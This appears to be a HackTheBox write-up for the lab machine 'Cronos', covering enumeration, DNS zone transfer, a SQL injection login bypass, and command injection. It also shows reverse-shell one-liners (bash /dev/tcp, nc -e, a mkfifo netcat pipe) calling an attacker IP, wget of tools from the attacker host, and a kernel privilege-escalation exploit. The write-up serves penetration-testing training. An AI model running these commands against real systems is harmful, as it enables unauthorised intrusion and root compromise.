---
layout: post
title:  "HackTheBox - Cronos Writeup"
categories: HackTheBox
tags: [pentesting]
draft: false
---

# Introduction

This is a writeup for the machine "Cronos" (10.10.10.13) on the platform HackTheBox. HackTheBox is a penetration testing labs platform so aspiring pen-testers & pen-testers can practice their hacking skills in a variety of different scenarios.

## Enumeration

### NMAP

Let's start off with our two nmap scans, a full TCP & a full UDP. In this case only our TCP scan returned any results so we're only going to analyse the output of the TCP scan.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-25 23:00 BST
Nmap scan report for 10.10.10.13
Host is up (0.038s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I was initially quite interested in port 80 due to the fact that a lot of the boxes on HackTheBox start with web-exploitation in some way or another, however, DNS being open did stand out quite a lot.

### HTTP 

I first did the typical thing of running a directory enumeration tool, I use dirb for this although as you can see below, we didn't get much back from this at all.

```
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May 25 23:02:46 2019
URL_BASE: http://10.10.10.13/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.13/ ----
+ http://10.10.10.13/index.html (CODE:200|SIZE:12454)
+ http://10.10.10.13/server-status (CODE:403|SIZE:299)
```

This instantly suggests to us that perhaps this site is unfinished/not properly configured, let's try use Nikto to see if we can find any other interesting information/configuration problems we might be able to leverage.

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.13
+ Target Hostname:    10.10.10.13
+ Target Port:        80
+ Start Time:         2019-05-25 23:03:31 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x30a6 0x555402443a52b 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7499 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2019-05-25 23:08:39 (GMT1) (308 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Like the directory bruteforce, Nikto did not return much for us again, at this point I decided that I would start checking out the DNS side of things as I wasn't getting anywhere fast with the web page enumeration. When visiting the site, we just get an Apache default configuration page so that cements that perhaps this website is unfinished/in-production.

### DNS

As DNS is open, and that is quite uncommon on HackTheBox we're going to add the device to our `/etc/hosts` file and then do some basic DNS enumeration. if you `nano /etc/hosts` and then add `10.10.10.13  cronos.htb` to the hosts file and save, we can then do some DNS enumeration. In this case we could educatedly guess the DNS name quite easily. Now we've done that we can use the `host` command in order to enumerate DNS information such as aliases, etc. 

```
host -l cronos.htb 10.10.10.13
Using domain server:
Name: 10.10.10.13
Address: 10.10.10.13#53
Aliases: 

cronos.htb name server ns1.cronos.htb.
cronos.htb has address 10.10.10.13
admin.cronos.htb has address 10.10.10.13
ns1.cronos.htb has address 10.10.10.13
www.cronos.htb has address 10.10.10.13
```

Oh look - `admin.cronos.htb`! Let's add this to our `/etc/hosts` again and then web-browse to the page.

### User Exploitation

Oh look, we've now got a login screen! I tried some basic logins such as `admin/admin` but I didn't get any luck with this so I stopped going down that path of default credentials.

![login page](/assets/images/2019-05-26-Cronos/LoginPage.png)

After failing at the default credential route I decided to go ahead and try some basic SQLi queries to try and bypass the login screen, I ended up going with `admin' or '1'='1` and that seemed to work for me, with the password being anything you want.

![sqli](/assets/images/2019-05-26-Cronos/sqli.png)

This logged us straight in and we come across a web-based command prompt that let's us execute a traceroute or a ping, typically tools like this are very poorly written and the input is typically unsanitised.

I'm first going to try and execute a basic command injection by appending an icmp back to my attacking machine on the end of the existing command. We'll use TCPDump to listen back for this ping, so we use `tcpdump ip proto \\icmp -i tun0` in order to do this and then from the web page we run the following.


![ping](/assets/images/2019-05-26-Cronos/nettool.png)

As you can see in the below tcpdump output, our connection is working, we can also see this in the web-based command panel so that's a good sign. A. we've got connectivity and B. our command injection is working via `&`.

```
tcpdump ip proto \\icmp -i tun0

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
23:26:10.928326 IP cronos.htb > KaliAttacker: ICMP echo request, id 5855, seq 1, length 64
23:26:10.928368 IP KaliAttacker > cronos.htb: ICMP echo reply, id 5855, seq 1, length 64
23:26:11.923451 IP cronos.htb > KaliAttacker: ICMP echo request, id 5855, seq 2, length 64
23:26:11.923461 IP KaliAttacker > cronos.htb: ICMP echo reply, id 5855, seq 2, length 64
23:26:12.925157 IP cronos.htb > KaliAttacker: ICMP echo request, id 5855, seq 3, length 64
23:26:12.925169 IP KaliAttacker > cronos.htb: ICMP echo reply, id 5855, seq 3, length 64
23:26:13.926582 IP cronos.htb > KaliAttacker: ICMP echo request, id 5855, seq 4, length 64
23:26:13.926594 IP KaliAttacker > cronos.htb: ICMP echo reply, id 5855, seq 4, length 64
```

Now we've got command injection, let's move into exploitation for user. What we're going to do is use a reverse shell in order to get a connection back to our machine. I had to try a few different shells here but I eventually got one that worked. I first tried using `bash -i >& /dev/tcp/10.10.14.12/8080 0>&1` from a nice list of typical reverse shells however it didn't work so then I tried using Netcat with `nc -e /bin/sh 10.10.14.12 8080` however, that didn't work either so I scrolled down to the Netcat section on [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) there is an interesting command/method for still using netcat here with `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 8080 >/tmp/f` and this worked. So now we have a user we grab the user flag and then we're going to work on the privilege escalation aspect.

```
Listening on [unknown] (family 0, port 1906660159)
Connection from 10.10.10.13 44088 received!
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
$ 
$ locate user.txt
/home/noulis/user.txt
```

### Privilege Escalation

With every Linux box, I always run LinEnum so the first thing we're going to do is get the script onto the box, this is very easy to do. We will first setup a SimpleHTTPServer with `python -m SimpleHTTPServer 8000`, from here we will use `wget http://10.10.14.12:8000/linenum.sh` on the box in the `/tmp` directory (so we have write permissions). We will then `chmod 777 linenum.sh` and run the script. Once it finishes the first thing we will examine the output.

The very first thing I note from the LinEnum output is the Ubuntu verison & the kernel version, so the kernel is running on `4.4.0-72-generic` and the OS version is `16.04.2` so let's first go to Google and search `4.4.0-72-generic privilege escalation` and the first thing that comes up is a [Local Priv Esc for < 4.4.0-116 on ExploitDB](https://www.exploit-db.com/exploits/44298), let's take a look at this. It doesn't look like it was tested on our exact version of Ubuntu but it should work, so let's grab the exploit, compile it using `gcc -o 44298 44298.c` and then use the SimpleHTTPServer to transfer the file into our `/tmp` directory again, from here will use `chmod` to give it execution permissions and then we will run the script exploit.

```
$ ./44298

id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

cat /root/root.txt
```

Oh and look, we got root! That's it! Grab the flag and you're done. Thank you for reading another writeup, this is an OSCP like box so this is great practice for that!
